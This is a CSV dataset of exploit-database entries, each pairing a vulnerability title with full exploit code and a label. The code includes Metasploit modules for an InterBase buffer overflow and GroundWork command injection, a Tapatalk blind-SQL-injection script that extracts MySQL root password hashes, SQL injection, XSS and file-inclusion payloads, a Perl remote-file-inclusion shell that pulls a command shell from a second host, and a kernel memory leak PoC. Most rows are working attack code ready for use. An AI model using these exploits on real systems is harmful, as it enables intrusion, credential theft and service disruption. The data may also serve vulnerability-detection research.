10020,"Borland Interbase 2007/2007 SP2 - 'jrd8_create_database' Remote Buffer Overflow (Metasploit) ## # $Id$ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Borland InterBase jrd8_create_database() Buffer Overflow', 			'Description'	=> %q{ 				This module exploits a stack overflow in Borland InterBase 				by sending a specially crafted create request. 			}, 			'Version'	=> '$Revision$', 			'Author'	=> 				[ 					'ramon', 					'Adriano Lima <adriano@risesecurity.org>', 				], 			'Arch'		=> ARCH_X86, 			'Platform'	=> 'linux', 			'References'	=> 				[ 					[ 'CVE', '2007-5243' ], 					[ 'OSVDB', '38606' ], 					[ 'BID', '25917' ], 					[ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ], 				], 			'Privileged'	=> true, 			'License'	=> MSF_LICENSE, 			'Payload'	=> 				{ 					'Space' => 128, 					'BadChars' => ""\x00\x2f\x3a\x40\x5c"", 				}, 			'Targets'	=> 				[ 					# 0x0804cbe4 pop esi; pop ebp; ret 					[ 						'Borland InterBase LI-V8.0.0.53 LI-V8.0.0.54 LI-V8.1.0.253', 						{ 'Ret' => 0x0804cbe4 } 					], 				], 			'DefaultTarget'	=> 0 		))  		register_options( 			[ 				Opt::RPORT(3050) 			], 			self.class 		)  	end  	def exploit  		connect  		# Create database 		op_create = 20  		length = 544 		remainder = length.remainder(4) 		padding = 0  		if remainder > 0 			padding = (4 - remainder) 		end  		buf = ''  		# Operation/packet type 		buf << [op_create].pack('N')  		# Id 		buf << [0].pack('N')  		# Length 		buf << [length].pack('N')  		# It will return into this nop block 		buf << make_nops(length - payload.encoded.length - 4)  		# Payload 		buf << payload.encoded  		# Target 		buf << [target.ret].pack('V')  		# Padding 		buf << ""\x00"" * padding  		# Database parameter block  		# Length 		buf << [1024 * 32].pack('N')  		# Random alpha data 		buf << rand_text_alpha(1024 * 32)  		sock.put(buf)  		handler  	end  end","[""'jrd8_create_database'""]",1
9521,"Linux Kernel 2.6.30 - 'atalk_getname()' 8-bytes Stack Disclosure (1) /**  * appleak.c  *  * Linux keunouille <= 2.6.30  *  * AppleTalk getsockname() 8-bytes kernel stack disclosure  *  * http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=3d392475c873c10c10d6d96b94d092a34ebd4791  *  * atalk_getname() can leak 8 bytes of kernel memory to user  *  * [clem1@noe ~]$ ./appleak  * 1e 83 f2 31 ec 56 d7 f6 | ...1.V..  * 00 f4 55 f6 84 2a ca bf | ..U..*..  * 00 f4 55 f6 1e 83 f2 31 | ..U....1  * 1e 83 f2 31 00 60 5e f6 | ...1.`^.  * 00 f4 55 f6 84 2a ca bf | ..U..*..  * c0 2a 54 c0 a8 61 45 f6 | .*T..aE.  * 21 54 12 c0 84 2a ca bf | !T...*..  * (...)  *  * (c) ClÃ©ment LECIGNE <root[a]clem1.be>  */ #include <stdlib.h> #include <string.h> #include <stdio.h> #include <errno.h> #include <unistd.h> #include <time.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/syscall.h> #include <net/if_arp.h> #include <linux/atalk.h>  void kernop(int fd) {     /* from Jon Oberheide sploit      */     const int   randcalls[] = {         __NR_read, __NR_write, __NR_open, __NR_close, __NR_stat, __NR_lstat,         __NR_lseek, __NR_rt_sigaction, __NR_rt_sigprocmask, __NR_ioctl,          __NR_access, __NR_pipe, __NR_sched_yield, __NR_mremap, __NR_dup,          __NR_dup2, __NR_getitimer, __NR_setitimer, __NR_getpid, __NR_fcntl,          __NR_flock, __NR_getdents, __NR_getcwd, __NR_gettimeofday,          __NR_getrlimit, __NR_getuid, __NR_getgid, __NR_geteuid, __NR_getegid,         __NR_getppid, __NR_getpgrp, __NR_getgroups, __NR_getresuid,          __NR_getresgid, __NR_getpgid, __NR_getsid,__NR_getpriority,          __NR_sched_getparam, __NR_sched_get_priority_max     };     const int   randsopts[] = { SOL_SOCKET, AF_APPLETALK };     int         ret, len;     char        buf[1024];      do     {         switch ( rand() % 3 )         {             case 0:                 ret = syscall(randcalls[rand() % sizeof(randcalls)/sizeof(randcalls[0])]);                 break;             case 1:                 len = (rand() % 2) ? sizeof(int) : sizeof(buf);                 ret = getsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, &len);                 break;             case 2:                 len = (rand() % 2) ? sizeof(int) : sizeof(buf);                 ret = setsockopt(fd, randsopts[rand() % sizeof(randsopts)/sizeof(randsopts[0])], rand() % 130, &buf, len);                 break;         }     }     while ( ret < 0 ); }  void dump( unsigned char * data, unsigned int len ) {     unsigned int dp, p;     const char trans[] =     ""................................ !\""#$%&'()*+,-./0123456789""     "":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm""     ""nopqrstuvwxyz{|}~....................................""     "".....................................................""     ""........................................"";      for ( dp = 1; dp <= len; dp++ )     {         printf(""%02x "", data[dp-1]);         if ( (dp % 8) == 0 )         {             printf(""| "");             p = dp;             for ( dp -= 8; dp < p; dp++ ) {                 printf(""%c"", trans[data[dp]]);             }             printf(""\n"");         }     }      return; }  int main(void) {     struct sockaddr_at  sat;     int                 s, len = sizeof(sat), occ = 500;     char                prev_zero[sizeof(sat.sat_zero)] = { 0 };      s = socket(AF_APPLETALK, SOCK_DGRAM, 0);     if ( s == -1 )     {         perror(""socket"");         return EXIT_FAILURE;     }      memset(&sat, 0, sizeof(sat));     sat.sat_family = AF_APPLETALK;     sat.sat_addr.s_net = htons(ATADDR_ANYNET);     sat.sat_addr.s_node = ATADDR_ANYNODE;     sat.sat_port = ATADDR_ANYPORT;      if ( bind(s, (struct sockaddr *) &sat, len) < 0 )     {         perror(""bind"");         return EXIT_FAILURE;     }      srand(time(NULL) ^ getpid());      while ( --occ )     {         kernop(s);          if ( getsockname(s, (struct sockaddr *) &sat, &len) == 0 )         {             if ( memcmp(sat.sat_zero, prev_zero, sizeof(sat.sat_zero)) != 0 )             {                 dump((unsigned char *) &sat.sat_zero, sizeof(sat.sat_zero));                 memcpy(&prev_zero, &sat.sat_zero, sizeof(sat.sat_zero));                 usleep(5000);             }         }     }      close(s);      return EXIT_SUCCESS; }  // milw0rm.com [2009-08-26]","[""'atalk_getname()'""]",1
9847,"Portili Personal and Team Wiki 1.14 - Multiple Vulnerabilities (1) Abysssec Inc Public Advisory   Title  : Portili Personal and Team Wiki Multiple Remote Vulnerabilities Affected Version : Portili Personal and Team Wik   <= 1.14 Vendor  Site   : www.Portili.com  Discovery : www.Abysssec.com   Vendor Contact  : 10/4/2009 Vendor Response : 11/4/2009  Vendor Response :   i have fixed all the vulnerabilities outlined and will release the fixes in the next version of the wiki. The most troublesome vulnerabilities have come from the included ajaxfilemanager 3rd party image manager  application (particularly in trying to integrate it with my own user authentication system).  I'm planning to completely overhaul this at some point.    Description :   this vulnerabites founded for a internal penetration testing project but now we decide to send vulnerabites to vendor.  so there is no point to keep these private anymore these vulnerabities are just for educational purpose and author will  be not be responsible for any damage using this vulnerabiltes .   Vulnerabilites :    1- Admin Password Disclosure Exploit in ajaxfilemanager/ajax_save_name.php  Vulnerability :   there an intersting vulnerability in this code .    line 16-23  elseif(empty($_POST['name'])) 	{ 		$error = ERR_RENAME_EMPTY; 	}elseif(!preg_match(""/^[a-zA-Z0-9 _\-.]+$/"", $_POST['name'])) 	{ 		$error = ERR_RENAME_FORMAT; 	}elseif(empty($_POST['original_path']) || !file_exists($_POST['original_path'])) 	    =======================================  line 39-68  	//update record of session if image exists in session for cut or copy 		include_once(CLASS_SESSION_ACTION); 		$sessionAction = new SessionAction();		 		$selectedDocuments = $sessionAction->get(); 		if(removeTrailingSlash($sessionAction->getFolder()) == getParentPath($_POST['original_path']) && sizeof($selectedDocuments)) 		{ 			if(($key = array_search(basename($_POST['original_path']), $selectedDocuments)) !== false) 			{ 				$selectedDocuments[$key] = $_POST['name']; 				$sessionAction->set($selectedDocuments); 				 			} 			 		}elseif(removeTrailingSlash($sessionAction->getFolder()) == removeTrailingSlash($_POST['original_path'])) 		{ 			$sessionAction->setFolder($_POST['original_path']); 		}	 		$path = addTrailingSlash(getParentPath($_POST['original_path'])) . $_POST['name']; 		if(is_file($path)) 		{ 			include_once(CLASS_FILE); 			$file = new file($path); 			$fileInfo = $file->getFileInfo(); 		}else 		{ 			include_once(CLASS_MANAGER); 			$manager = new manager($path, false); 			$fileInfo = $manager->getFolderInfo(); 		} 	}  =============================================================================== there is two problem in code first is it won't check for logged user and next is in the logic of this code . as you can see in code we can change any directory even config directory so we can copy the config to uplods and then you can  download the config file that contains user / pass of administrator .  PoC : http://vulnerable.com/ajaxfilemanager/ajax_save_name.php  POST: original_path=../application/config&name=uploads  now you can go and download the config .   Fast Solution :   add this lines to first of ajax_save_name.php          // ensure that only logged in users may access this script 	if (!file_exists('../authenticate_user.php')) { exit(""couldn't locate the file authenticate_user.php""); }	//exit if the user authentication script cannot be found 	require_once('../authenticate_user.php');	//exit if the user is not authenticated by the codeigniter application     2- File Upload Vulnerability /Fckeditor  Vulnerability :   Using Fckeditor without any authentication will give ability to attacker to  upload his / her own file and fckeditor won't check file extention it will give ability to attacker upload a malicius server side ASP / ASPX / PHP  / JSP . so this vulnerability can creation access to server / portal completely .   PoC : http://www.vulnerable.com/fckeditor/editor/filemanager/connectors/test.html   3- Information Leakage in /phpinfo.php  Vulnerability:   there is phpinfo.php can leak information about path and installation of web / php and  disabled / enabled functions as well as extentions and modules .  PoC : http://www.vulnerable.com/phpinfo.php   4- Cross Site Scripting in ajaxfilemanager/ajaxfilemanager.php   Vulnerability :  after you logged in into the admin panel with a valid password there is a uncheked variable named view .  line 49-61  	if(!empty($_GET['view'])) 	{ 		switch($_GET['view']) 		{ 			case 'detail': 			case 'thumbnail': 				$view = $_GET['view']; 				break; 			default: 				$view = CONFIG_DEFAULT_VIEW; 		} 	}else  	{ 		$view = CONFIG_DEFAULT_VIEW; 	}  PoC  : http://vulnerable.com/ajaxfilemanager/ajaxfilemanager.php?path=../uploads/&view=1<script>alert(""abysssec"")</script>    feel free to contact me : admin [at] abysssec.com","['name.php ', ""user.php'"", 'phpinfo.php ']",1
5411,"Dream4 Koobi Pro 6.25 Links - 'categ' SQL Injection ########################################## # # Koobi Pro 6.25 links(categ) # all version Koobi  ########################################## # ##AUTHOR : S@BUN # ####HOME : http://www.milw0rm.com/author/1334 # ####BLOG : http://my.opera.com/SQL-Injection/blog/ # ####MAiL : hackturkiye.hackturkiye@gmail.com # ########################################### # # DORK 1 : allinurl: ""index.php?showlink""links # ########################################### EXPLOiT :  index.php?showlink=S@BUN&fid=S@BUN8&p=links&area=1&categ=-1+union+select+0,concat(email,0x3a,pass),2+from+kpro_user admin login=admin/login.php  ########################################### ------------------S@BUN-------------------# ########################################### -----hackturkiye.hackturkiye@gmail.com----# ########################################### --http://my.opera.com/SQL-Injection/blog/-# ###########################################  # milw0rm.com [2008-04-08]","[""'categ'""]",1
35102,"Tapatalk for vBulletin 4.x - Blind SQL Injection #!/usr/bin/env python # -*- coding: utf-8 -*- ''' @author: tintinweb 0x721427D8 ''' import urllib2, urllib import xmlrpclib,re, urllib2,string,itertools,time from distutils.version import LooseVersion   class Exploit(object):     def __init__(self, target, debug=0 ):         self.stopwatch_start=time.time()         self.target = target         self.path = target         self.debug=debug         if not self.target.endswith(""mobiquo.php""):             self.path = self.detect_tapatalk()             if not self.path:                 raise Exception(""Could not detect tapatalk or version not supported!"")         self.rpc_connect()         self.attack_func = self.attack_2      def detect_tapatalk(self):         # request page, check for tapatalk banner         handlers = [                     urllib2.HTTPHandler(debuglevel=self.debug),                     urllib2.HTTPSHandler(debuglevel=self.debug),                      ]         ua = urllib2.build_opener(*handlers)         ua.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3')]         data = ua.open(self.target).read()         if self.debug:             print data         if not ""tapatalkDetect()"" in data:             print ""[xx] could not detect tapatalk. bye...""             return None                      # extract tapatalk version         print ""[ i] Taptalk detected ... "",         path = """".join(re.findall(r""^\s*<link href=[\s'\""]?(http://.*?/)smartbanner/appbanner.css"", data, re.MULTILINE|re.DOTALL))         path+=""mobiquo.php""         print ""'%s' ... ""%path,         data = urllib.urlopen(path).read()         version = """".join(re.findall(r""Current Tapatalk plugin version:\s*([\d\.a-zA-Z]+)"", data))         if LooseVersion(version) <= LooseVersion(""5.2.1""):             print ""v.%s  :) - OK""%version                 return path         print ""v.%s :( - not vulnerable""%version         return None          def rpc_connect(self):         self.rpc = xmlrpclib.ServerProxy(self.path,verbose=self.debug)              def attack_1(self, sqli, sleep=2):                  '''         SELECT subscribethreadid                     FROM subscribethread AS subscribethread                     LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)                     WHERE subscribethreadid = <INJECTION>                       AND subscribethreadid.userid = 0"";                                <INJECTION>: 1 UNION ALL <select_like_probe> OR FALSE         '''                  query = ""-1 union %s and  (  select sleep(%s)   )  ""%(sqli,sleep)         query += ""union select subscribethreadid from subscribethread  where 1=1 OR 1=1""          # fix query for ""AND subscribeforum.userid=0""                  if self.debug:             print """"""  SELECT subscribethreadid                     FROM subscribethread AS subscribethread                     LEFT JOIN user AS user ON (user.userid=subscribethread.userid)                     WHERE subscribethreadid = %s                       AND subscribethread.userid = 0""""""%query                  return self.rpc.unsubscribe_topic(""s_%s""%query)   #no escape, invalid_char=""_""          def attack_2(self, sqli, sleep=2):         '''         SELECT subscribeforumid                     FROM subscribeforum AS subscribeforum                     LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)                     WHERE subscribeforumid = <INJECTION>                       AND subscribeforum.userid = 0"";                                <INJECTION>: 1 UNION ALL <select_like_probe> OR FALSE         '''                  query = ""-1 union %s and  (  select sleep(%s)   )  ""%(sqli,sleep)         query += ""union select subscribeforumid from subscribeforum  where 1=1 OR 1=1""          # fix query for ""AND subscribeforum.userid=0""                  if self.debug:             print """"""  SELECT subscribeforumid                     FROM subscribeforum AS subscribeforum                     LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)                     WHERE subscribeforumid = %s                       AND subscribeforum.userid = 0""""""%query                                return self.rpc.unsubscribe_forum(""s_%s""%query)   #no escape, invalid_char=""_""              def attack_blind(self,sqli,sleep=2):         return self.attack_func(sqli,sleep=sleep)         #return self.attack_func(""-1 OR subscribethreadid = ( %s AND (select sleep(4)) )  UNION SELECT 'aaa' FROM subscribethread  WHERE subscribethreadid = -1 OR 1 ""%sqli)              def attack_blind_guess(self,query, column, charset=string.ascii_letters+string.digits,maxlength=32, sleep=2, case=True):         '''         provide <query> = select -1 from user where user='debian-sys-maint' where <COLUMN> <GUESS>         '''           hit = False         # PHASE 1 - guess entry length         print ""[    ] trying to guess length ...""         for guess_length in xrange(maxlength+1):             q = query.replace(""<COLUMN>"",""length(%s)""%column).replace(""<GUESS>"",""= %s""%guess_length)                          self.stopwatch()             self.attack_blind(q, sleep)             duration = self.stopwatch()                          print ""."",                          if  duration >= sleep-sleep/8:                 # HIT! - got length! => guess_length                 hit = True                 print """"                 break                  if not hit:             print ""[ !!] unable to guess password length, check query!""             return None                           print ""[  *] LENGTH = %s""%guess_length                  # PHASE 2 - guess password up to length         print ""[    ] trying to guess value  ...""         hits = 0         result = """"         for pos in xrange(guess_length):             # for each char pos in up to guessed length             for attempt in self.bruteforce(charset, 1):                 # probe all chars in charset                 #attempt = re.escape(attempt)                 if attempt == ""%%"":                     attempt= ""\%""                 #LIKE binary = case sensitive.might be better to do caseinsensitive search + recheck case with binary                 q = query.replace(""<COLUMN>"",column).replace(""<GUESS>"",""LIKE '%s%s%%' ""%(result,attempt))                              self.stopwatch()                 self.attack_blind(q, sleep)                 duration = self.stopwatch()                              #print result,attempt,""  "",duration                 print ""."",                 if  duration >= sleep-sleep/8:                     if case:                         # case insensitive hit - recheck case: this is drastically reducing queries needed.                         q = query.replace(""<COLUMN>"",column).replace(""<GUESS>"",""LIKE binary '%s%s%%' ""%(result,attempt.lower()))                         self.stopwatch()                         self.attack_blind(q, sleep)                         duration = self.stopwatch()                         if  duration >= sleep-sleep/8:                             attempt = attempt.lower()                         else:                             attempt = attempt.upper()                         # case sensitive - end                                                                                        # HIT! - got length! => guess_length                     hits += 1                     print """"                     print ""[  +] HIT! - %s[%s]..""%(result,attempt)                     result += attempt                     break                               if not hits==guess_length:             print ""[ !!] unable to guess password length, check query!""             return None                  print ""[  *] SUCCESS!: query: %s""%(query.replace(""<COLUMN>"",column).replace(""<GUESS>"",""='%s'""%result))          return result             def bruteforce(self, charset, maxlength):         return (''.join(candidate)             for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)             for i in range(1, maxlength + 1)))              def stopwatch(self):         stop = time.time()         diff = stop - self.stopwatch_start         self.stopwatch_start=stop         return diff          if __name__==""__main__"":     #googledork:  https://www.google.at/search?q=Tapatalk+Banner+head+start     DEBUG = False     TARGET = ""http://TARGET/vbb4/forum.php""     x = Exploit(TARGET,debug=DEBUG)      print ""[   ] TAPATALK for vBulletin 4.x - SQLi""     print ""[--] Target: %s""%TARGET     if DEBUG: print ""[--] DEBUG-Mode!""           print ""[ +] Attack - sqli""       query = u""-1  UNION SELECT 1%s""%unichr(0)     if DEBUG:         print u""""""  SELECT subscribeforumid                 FROM subscribeforum AS subscribeforum                 LEFT JOIN user AS user ON (user.userid=subscribeforum.userid)                 WHERE subscribeforumid = %s                   AND subscribeforum.userid = 0""""""%query       print ""[ *] guess mysql user/pass""     print x.attack_blind_guess(""select -1 from mysql.user where user='root' and <COLUMN> <GUESS>"",                                 column=""password"",                                charset=""*""+string.hexdigits,                                maxlength=45)        # usually 40 chars + 1 (*)          print ""[ *] guess apikey""     print x.attack_blind_guess(""select -1 from setting where varname='apikey' and <COLUMN> <GUESS>"",                                column='value',                                charset=string.ascii_letters+string.digits,                                maxlength=14,                                )      print ""-- done --""","['mobiquo.php""']",1
36072,"OneFileCMS 1.1.1 - 'onefilecms.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/49257/info  OneFileCMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  OneFileCMS 1.1.1 is vulnerable; other versions may also be affected.   http://www.example.com/onefilecms/onefilecms.php?p='""><marquee><h1>XSS Vulnerability<script>alert(String.fromCharCode(88,83,83))</script></h1></marquee>","[""'onefilecms.php'""]",1
9455,"Microsoft Internet Explorer - JavaScript SetAttribute Remote Crash <html>  <head>   <title> Irfan Asrar</title>  </head> <body onload=""c()""> Set Attribute Crash : Tested with IE7 Vista                                   IE6 XP2                                   IE6 XP3  <script type=""text/javascript"">  function c() {  var li = document.createElement(""li""); li.setAttribute(""value"", ""1""); li.value = ""1"";  }  </script>  </body> </html>  # milw0rm.com [2009-08-18]",['JavaScript SetAttribute'],1
2175,"WEBInsta CMS 0.3.1 - 'templates_dir' Remote File Inclusion #!/usr/bin/perl ## # WEBinsta CMS 0.3.1 (templates_dir) Remote File Inclusion Exploit # Bug Found & code By K-159  ## # echo.or.id (c) 2006 #  ## # usage: # perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable> # # perl WEBinsta.pl http://target.com/ http://site.com/cmd.txt cmd # # cmd shell example: <?passthru($_GET[cmd]);?> # # cmd shell variable: ($_GET[cmd]); ## # # #Greetz: My Dearest Wife - ping, echo|staff (y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative), SinChan, sakitjiwa, maSter-oP, mr_ny3m, bithedz, lieur-euy, x16, mbahngarso, etc #  # Contact: www.echo.or.id #e-c-h-o @irc.dal.net ##  use LWP::UserAgent;  $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];  if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}  head();  while() {        print ""[shell] \$""; while(<STDIN>)        {                $cmd=$_;                chomp($cmd);  $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.'index.php?templates_dir='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";  $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[....]/;  if (!$cmd) {print ""\nPlease Enter a Command\n\n""; $return ="""";}  elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)        {print ""\nCould Not Connect to cmd Host or Invalid Command Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nInvalid Command or No Return\n\n""}  if($return =~ /(.*)/)   {        $finreturn = $1;        $finreturn=~ tr/[....]/[\n]/;        print ""\r\n$finreturn\n\r"";        last; }  else {print ""[shell] \$"";}}}last;  sub head()  {  print ""\n============================================================================\r\n"";  print "" *WEBinsta CMS 0.3.1 templates_dir Remote File Inclusion Exploit*\r\n"";  print ""============================================================================\r\n"";  } sub usage()  {  head();  print "" Usage: perl WEBinsta.pl <target> <cmd shell location> <cmd shell variable>\r\n\n"";  print "" <Site> - Full path to WEBinsta CMS ex: http://www.site.com/ \r\n"";  print "" <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n"";  print "" <cmd variable> - Command variable used in php shell \r\n"";  print ""============================================================================\r\n"";  print ""                           Bug Found by K-159 \r\n"";  print ""                    www.echo.or.id #e-c-h-o irc.dal.net 2006 \r\n"";  print ""============================================================================\r\n"";  exit();  }  # milw0rm.com [2006-08-12]","[""'templates_dir'""]",1
25001,"GroundWork - 'monarch_scan.cgi' OS Command Injection (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. #   http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    HttpFingerprint = { :pattern => [ /Apache-Coyote\/1\.1/ ] }    include Msf::Exploit::Remote::HttpClient    def initialize(info={})     super(update_info(info,       'Name'           => ""GroundWork monarch_scan.cgi OS Command Injection"",       'Description'    => %q{           This module exploits a vulnerability found in GroundWork 6.7.0. This software         is used for network, application and cloud monitoring. The vulnerability exists in         the monarch_scan.cgi, where user controlled input is used in the perl qx function,         which allows any remote authenticated attacker, whatever his privileges are, to         inject system commands and gain arbitrary code execution. The module has been tested         successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04         based VM appliance.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Johannes Greil', # Vulnerability Discovery, PoC           'juan vazquez'  # Metasploit module         ],       'References'     =>         [           [ 'OSVDB', '91051' ],           [ 'US-CERT-VU', '345260' ],           [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt' ]         ],       'Arch'            => ARCH_CMD,       'Payload'        =>         {           'Space'       => 8190,           'DisableNops' => true,           'Compat'          =>             {               'PayloadType' => 'cmd'             },           # Based on the default Ubuntu 10.04 VM appliance           'RequiredCmd' => 'generic telnet netcat perl python'         },       'Platform'       => ['unix', 'linux'],       'Targets'        =>         [           ['GroundWork 6.7.0', {}]         ],       'Privileged'     => false,       'DisclosureDate' => ""Mar 8 2013"",       'DefaultTarget'  => 0))        register_options(         [           OptString.new('USERNAME',  [true, 'GroundWork Username', 'user']),           OptString.new('PASSWORD',  [true, 'GroundWork Password', 'user'])         ], self.class)   end    def check     res = send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(""josso"", ""signon"", ""login.do"")     })      if res and res.body =~ /GroundWork.*6\.7\.0/       return Exploit::CheckCode::Appears     elsif res and res.body =~ /GroundWork/       return Exploit::CheckCode::Detected     else       return Exploit::CheckCode::Safe     end   end    def get_josso_token     res = send_request_cgi({       'method'    => 'POST',       'uri'       => normalize_uri(""josso"", ""signon"", ""usernamePasswordLogin.do""),       'vars_post' => {         'josso_cmd'      => 'login',         'josso_username' => datastore['USERNAME'],         'josso_password' => datastore['PASSWORD']       }     })     if res and res.headers['Set-Cookie'] =~ /JOSSO_SESSIONID_josso=([A-F0-9]+)/       return $1     else       return nil     end   end    def execute_command(command)     http_handler = ((datastore['SSL']) ? ""https"" : ""http"")     res = send_request_cgi({       'method'    => 'GET',       'uri'       => normalize_uri(""monarch"", ""monarch_scan.cgi""),       'headers'   =>         {           'Referer' => ""#{http_handler}://#{rhost}/portal/auth/portal/groundwork-monitor/auto-disc""         },       'cookie'    => ""JOSSO_SESSIONID=#{@josso_id}"",       'query'     => ""args=#{rand_text_alpha(3)}&args=#{rand_text_alpha(3)}&args=#{Rex::Text.uri_encode(command + "";"")}""     })     return res   end    def exploit     peer = ""#{rhost}:#{rport}""      print_status(""#{peer} - Attempting to login..."")     @josso_id = get_josso_token     if @josso_id.nil?       fail_with(Exploit::Failure::NoAccess, ""#{peer} - Unable to retrieve a JOSSO session ID"")     end     print_good(""#{peer} - Authentication successful"")      print_status(""#{peer} - Sending malicious request..."")     execute_command(payload.encoded)   end end","[""'monarch_scan.cgi'"", 'the']",1
9249,"XOOPS Celepar Module Qas - 'codigo' SQL Injection ********************************************************************************************************** Xoops Celepar Module Qas Donwload of Xoops Celepar : http://www.xoops.pr.gov.br/uploads/core/xoopscelepar.tar.gz Author: s4r4d0 mail:s4r4d0@yahoo.com ********************************************************************************************************** A Sql Injection has been found on modules Quas of Xoops Celepar in file Aviso.php . Source code:     }     $codigo = $_POST['codigo']; } else     $codigo = $_GET['codigo']; *********************************************************************************************************** Target: site.com.br/modules/qas/aviso.php?codigo= Sql Code :-1+UNION+SELECT+1,2,columnname,4,5,6,7,8+from+tablename Demo: http://www.dce.uem.br/modules/qas/aviso.php?codigo=-1+UNION+SELECT+1,2,3,4,5,6,7,8-- *********************************************************************************************************** [ Fatal Error Group Br ] [Greetz: to Elemento_pcx - m4v3rick - w4nt3d - DD3str0yer  - M0nt3r - Vympel] [From Brazil] ************************************************************************************************************  # milw0rm.com [2009-07-24]","[""'codigo'""]",1
3940,"CA BrightStor Backup 11.5.2.0 - 'Mediasvr.exe' Denial of Service #!/usr/bin/python # # Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll) # (Previously Unknown) # # There is an issue with RPC operation 126 and the imported cactirpc.dll  # and rwxdr.dll. It looks as if Mediasvr.exe identifies a Bad Job Handle  # as seen in its log file. #  # Log Message: # asms_manager_job_enumerate_devices_1_svc(): Bad Job Handle.   # # However, the process dies when trying to send an RPC response  # for the bad job handle. This is caused be a null memory dereference. # Within cactirpc.dll, the xdr_rwpair function is called:  # # Catirpc.dll:2E008A93 loc_2E008A93:                           # Catirpc.dll:2E008A93 mov     ecx, [esi+10h] # Catirpc.dll:2E008A96 push    ecx	<- ECX is 0x0041B310 (nulls) # Catirpc.dll:2E008A97 push    edi	<- EDI is 0x009e2580 (nulls) # Catirpc.dll:2E008A98 call    dword ptr [esi+14h] <-points to 0x2d6054f0 # Catirpc.dll:2E008A9B add     esp, 8		    (rwxdr.dll:xdr_rwpair) # Catirpc.dll:2E008A9E pop     edi # Catirpc.dll:2E008A9F pop     esi # Catirpc.dll:2E008AA0 pop     ebx # Catirpc.dll:2E008AA1 retn # # rwxdr.dll:xdr_rwpair # .text:2D6054F0 public xdr_rwpair # .text:2D6054F0 xdr_rwpair proc near                     # .text:2D6054F0     # .text:2D6054F0 arg_0= dword ptr  4 # .text:2D6054F0 arg_4= dword ptr  8 # .text:2D6054F0 # .text:2D6054F0 push    ebx # .text:2D6054F1 mov     ebx, [esp+4+arg_4] <---puts 0x0041B310 # .text:2D6054F5 push    esi # .text:2D6054F6 push    edi # .text:2D6054F7 mov     edi, [esp+0Ch+arg_0] <--- puts 0x009e2580 # .text:2D6054FB mov     esi, [ebx]	<---- EBX is 0x00000000 # .text:2D6054FD mov     eax, [edi]     <---- EDI is 0x00000000 # .text:2D6054FF test    eax, eax # .text:2D605501 jnz     short loc_2D605533 # .text:2D605503 mov     eax, [esi+4]	<---- ESI is set to 0x00000000 # # This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest  # CA patches on Windows XP SP2  # # CA has been notified # # Author: M. Shirk # # (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com  # # Use at your own Risk: You have been warned  #------------------------------------------------------------------------  import os import sys import time import socket import struct  #------------------------------------------------------------------------  #Start of RPC Packet rpc_packet=""\x80\x00\x00\x5c\x6b\x9b\x72\xbc\x00\x00\x00\x00\x00\x00\x00\x02""  #Program ID, and Operation 126 rpc_packet+=""\x00\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x7e""  #nulls after Operation rpc_packet+=""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""  #4 more bytes of junk (ALL HAIL BEEF) rpc_packet+=""\xde\xad\xbe\xef""  # Need to get the port Mediasvr.exe is listening on rpc_portmap_req=""\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00""  